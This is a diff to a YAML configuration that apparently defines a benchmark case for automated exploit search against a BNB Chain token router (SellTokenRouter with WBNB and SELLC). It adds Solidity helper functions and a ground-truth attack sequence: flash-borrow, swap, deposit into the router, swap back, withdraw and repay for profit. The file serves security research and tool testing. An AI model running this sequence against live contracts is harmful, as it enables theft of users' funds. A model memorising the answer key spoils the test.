@@ -32,9 +32,19 @@ ctrt_name2deploy:
     ]
   - ["srouter", "new SellTokenRouter (address(wbnb), address(usdt), address(sellc), address(router))"]
     
-extra_actions: []
+extra_actions: 
+  - "function deposit_srouter_wbnb_sellc(uint256 amount) internal eurus {
+      srouter.setTokenPrice(address(sellc));  
+      IERC20(wbnb).transfer(address(srouter.mkt()), amount);
+      srouter.ShortStart(address(sellc), address(attacker), 1, amount);  
+    }"
+  - "function withdraw_srouter_sellc_wbnb(uint256 amount) internal eurus {
+       srouter.withdraw(address(sellc));
+    }"
 
-extra_deployments: []
+
+extra_deployments: 
+  - "sellc.transfer(address(srouter.mkt()), 1020918 ether);"
 
 
 extra_statements:
@@ -46,7 +56,10 @@ attack_goal_str: "wbnb;1e6"
 groundtruth:
   - ["borrow", "wbnb", "owner", "428 ether"]
   - ["swap", "pair", "attacker", "wbnb", "sellc", "wbnb.balanceOf(address(attacker)) * 99 / 100", "5000000 ether"]
+  - ["deposit", "srouter", "wbnb", "sellc", "4 ether"]
   - ["swap", "pair", "attacker", "sellc", "wbnb", "sellc.balanceOf(address(attacker))", "pair.getAmountOut(sellc.balanceOf(address(attacker)), address(sellc))"]
+  - ["withdraw", "srouter", "sellc", "wbnb", "0"]
+  - ["payback", "wbnb", "owner", "428 ether"]
 
 # Information for search space building.
 roles:
